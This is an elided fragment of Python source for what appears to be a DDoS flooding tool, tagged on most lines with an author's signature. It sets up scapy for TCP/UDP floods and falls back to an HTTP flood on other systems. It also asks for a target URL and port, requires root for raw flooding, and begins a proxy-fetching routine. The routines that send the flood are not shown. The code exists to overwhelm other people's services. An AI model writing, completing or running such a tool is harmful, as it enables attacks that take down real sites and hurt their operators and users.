...
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # SCRIPT by CODEinPROGRESS

if sys.platform.startswith("linux"): # SCRIPT by CODEinPROGRESS
	from scapy.all import * # SCRIPT by CODEinPROGRESS
elif sys.platform.startswith("freebsd"): # SCRIPT by CODEinPROGRESS
	from scapy.all import * # SCRIPT by CODEinPROGRESS
else: # SCRIPT by CODEinPROGRESS
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # SCRIPT by CODEinPROGRESS
...
def starturl(): # SCRIPT by CODEinPROGRESS
	global url
	global url2
	global urlport
...
def floodmode():
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # SCRIPT by CODEinPROGRESS
				print("You need to run this program as root to use TCP/UDP flooding.") # SCRIPT by CODEinPROGRESS
				exit(0) # SCRIPT by CODEinPROGRESS
			else: # SCRIPT by CODEinPROGRESS
				floodport() # SCRIPT by CODEinPROGRESS
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # SCRIPT by CODEinPROGRESS
		if port in portlist: # SCRIPT by CODEinPROGRESS
			pass # SCRIPT by CODEinPROGRESS
		else: # SCRIPT by CODEinPROGRESS
			print ("You mistyped, try again.")
			floodport() # SCRIPT by CODEinPROGRESS
	except ValueError: # SCRIPT by CODEinPROGRESS
		print ("You mistyped, try again.") # SCRIPT by CODEinPROGRESS
		floodport() # SCRIPT by CODEinPROGRESS
	proxymode()
...
def proxyget1(): # SCRIPT by CODEinPROGRESS
	try:
